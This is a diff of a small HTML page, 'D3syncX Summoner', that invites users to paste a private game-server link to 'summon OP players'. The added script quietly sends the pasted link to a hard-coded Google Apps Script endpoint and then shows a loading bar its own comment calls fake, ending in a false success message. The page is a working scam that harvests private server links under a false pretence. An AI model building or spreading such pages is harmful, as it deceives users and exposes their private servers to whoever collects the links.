@@ -2,134 +2,90 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>D3syncX Server Summoner</title>
+  <title>D3syncX Summoner 😈</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #0d0d0d;
+      background-color: #000;
       color: white;
       display: flex;
       flex-direction: column;
-      align-items: center;
       justify-content: center;
+      align-items: center;
       height: 100vh;
       margin: 0;
     }
-
-    .box {
-      background-color: #111;
-      border: 2px solid #0ff;
-      border-radius: 15px;
-      padding: 20px 40px;
-      text-align: center;
-      box-shadow: 0 0 15px #0ff;
+    h1 {
+      font-size: 2em;
+      margin-bottom: 20px;
     }
-
     input {
-      width: 300px;
       padding: 10px;
       border: none;
-      border-radius: 8px;
-      margin-top: 10px;
-      outline: none;
-    }
-
-    button {
-      margin-top: 20px;
-      padding: 10px 30px;
-      border: none;
-      border-radius: 8px;
-      background: #0ff;
-      color: black;
-      font-weight: bold;
-      cursor: pointer;
-      transition: 0.2s;
-    }
-
-    button:hover {
-      background: #09d;
-      color: white;
-    }
-
-    .loading-screen {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: black;
-      color: #0ff;
-      display: none;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-      font-size: 24px;
-    }
-
-    .progress {
-      margin-top: 20px;
+      border-radius: 5px;
       width: 300px;
-      height: 20px;
-      background: #333;
-      border-radius: 10px;
-      overflow: hidden;
+      text-align: center;
+      margin-bottom: 20px;
     }
-
-    .progress-bar {
-      height: 100%;
-      width: 0%;
-      background: #0ff;
-      transition: width 0.1s linear;
+    button {
+      background-color: #6a00ff;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    button:hover {
+      background-color: #8b33ff;
+    }
+    #status {
+      margin-top: 20px;
+      font-size: 1.2em;
     }
   </style>
 </head>
 <body>
-  <div class="box">
-    <h2>D3syncX Server Summoner</h2>
-    <p>Paste your private server link:</p>
-    <input id="serverLink" type="text" placeholder="https://www.roblox.com/...">
-    <br>
-    <button onclick="startSummoning()">Start Summoning</button>
-  </div>
-
-  <div class="loading-screen" id="loading">
-    <p id="status">Connecting...</p>
-    <div class="progress">
-      <div class="progress-bar" id="progressBar"></div>
-    </div>
-  </div>
+  <h1>D3syncX Summoner 😈</h1>
+  <p>Paste your private server link below 👇</p>
+  <input type="text" id="linkInput" placeholder="Enter link here...">
+  <button onclick="sendLink()">Summon OP Players</button>
+  <p id="status"></p>
 
   <script>
-    function startSummoning() {
-      const link = document.getElementById("serverLink").value.trim();
-      if (!link.startsWith("https://www.roblox.com/")) {
-        alert("Invalid server link!");
+    async function sendLink() {
+      const linkInput = document.getElementById("linkInput").value;
+      const status = document.getElementById("status");
+
+      if (!linkInput.startsWith("https://")) {
+        status.innerText = "❌ Invalid link!";
         return;
       }
 
-      document.querySelector(".box").style.display = "none";
-      const loading = document.getElementById("loading");
-      const progressBar = document.getElementById("progressBar");
-      const status = document.getElementById("status");
-      loading.style.display = "flex";
+      status.innerText = "Summoning players... (0%)";
 
-      let percent = 0;
-      const totalTime = 5 * 60 * 1000; // 5 Minuten
-      const interval = totalTime / 100;
+      const scriptURL = "https://script.google.com/macros/s/AKfycbxTe0pa9oYiVC_S1GnbxkhBaweFpWJ6M6cZVjfmkO28SdOZ3enq34TTfJRKT2_etxzd/exec";
 
-      const timer = setInterval(() => {
-        percent++;
-        progressBar.style.width = percent + "%";
-        status.innerText = "Loading... " + percent + "%";
+      try {
+        await fetch(scriptURL, {
+          method: "POST",
+          body: JSON.stringify({ link: linkInput }),
+          headers: { "Content-Type": "application/json" },
+        });
 
-        if (percent >= 100) {
-          clearInterval(timer);
-          status.innerText = "OP Players have been summoned 😈";
-          setTimeout(() => {
-            loading.innerHTML = "<h1 style='color:#0ff;'>Summoning Complete!</h1>";
-          }, 2000);
-        }
-      }, interval);
+        // Fake loading bar
+        let percent = 0;
+        const loading = setInterval(() => {
+          percent += 2;
+          status.innerText = `Summoning players... (${percent}%)`;
+          if (percent >= 100) {
+            clearInterval(loading);
+            status.innerText = "✅ OP Players have been summoned!";
+          }
+        }, 100);
+      } catch (error) {
+        status.innerText = "⚠️ Error sending link!";
+      }
     }
   </script>
 </body>
